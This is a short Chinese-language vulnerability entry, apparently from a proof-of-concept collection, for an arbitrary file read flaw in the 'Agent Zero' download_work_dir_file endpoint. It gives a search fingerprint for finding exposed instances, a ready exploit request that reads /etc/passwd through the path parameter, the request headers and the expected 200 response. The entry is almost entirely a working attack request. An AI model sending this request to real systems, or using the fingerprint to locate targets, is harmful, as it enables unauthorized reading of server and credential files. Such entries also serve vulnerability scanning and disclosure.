# AgentZerodownload_work_dir_file存在任意文件读取漏洞

- **系统**：AgentZerodownload　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="Agent Zero"`
- **请求**：`GET /download_work_dir_file?path=/etc/passwd HTTP/1.1`
- **关键头**：`Priority: u=4`　`Content-Type: application/json`　`Content-Length: 91`
- **预期**：200　|　—